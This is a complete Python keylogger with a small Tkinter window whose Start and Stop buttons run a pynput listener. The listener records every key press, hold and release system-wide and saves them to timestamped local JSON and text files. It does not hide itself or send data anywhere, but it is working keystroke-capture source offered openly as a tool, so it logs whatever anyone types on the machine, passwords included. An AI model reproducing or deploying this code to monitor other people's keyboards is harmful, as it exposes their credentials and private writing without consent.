import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import time

unique_keys_used = []
flag_unique = False
unique_keys = ""
timestamp = str(int(time.time()))

def generate_text_log_unique(key):
    with open(f'unique_key_log_{timestamp}.txt', "w+") as unique_keys_file:
        unique_keys_file.write(key)

def generate_json_file_unique(unique_keys_used):
    with open(f'unique_key_log_{timestamp}.json', '+wb') as unique_key_log_file:
        unique_key_list_bytes = json.dumps(unique_keys_used).encode()
        unique_key_log_file.write(unique_key_list_bytes)

def on_press_unique(key):
    global flag_unique, unique_keys_used, unique_keys
    if flag_unique == False:
        unique_keys_used.append(
            {'Pressed': f'{key}'}
        )
        flag_unique = True

    if flag_unique == True:
        unique_keys_used.append(
            {'Held': f'{key}'}
        )
    generate_json_file_unique(unique_keys_used)


def on_release_unique(key):
    global flag_unique, unique_keys_used, unique_keys
    unique_keys_used.append(
        {'Released': f'{key}'}
    )

    if flag_unique == True:
        flag_unique = False
    generate_json_file_unique(unique_keys_used)

    unique_keys = unique_keys + str(key)
    generate_text_log_unique(str(unique_keys))

def start_keylogger_unique():
    global unique_listener
    unique_listener = keyboard.Listener(on_press=on_press_unique, on_release=on_release_unique)
    unique_listener.start()
    unique_label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'unique_keylogger.txt'")
    unique_start_button.config(state='disabled')
    unique_stop_button.config(state='normal')

def stop_keylogger_unique():
    global unique_listener
    unique_listener.stop()
    unique_label.config(text="Keylogger stopped.")
    unique_start_button.config(state='normal')
    unique_stop_button.config(state='disabled')

root_unique = Tk()
root_unique.title("Unique Keylogger")

unique_label = Label(root_unique, text='Click "Start" to begin keylogging.')
unique_label.config(anchor=CENTER)
unique_label.pack()

unique_start_button = Button(root_unique, text="Start", command=start_keylogger_unique)
unique_start_button.pack(side=LEFT)

unique_stop_button = Button(root_unique, text="Stop", command=stop_keylogger_unique, state='disabled')
unique_stop_button.pack(side=RIGHT)

root_unique.geometry("250x250")

root_unique.mainloop()
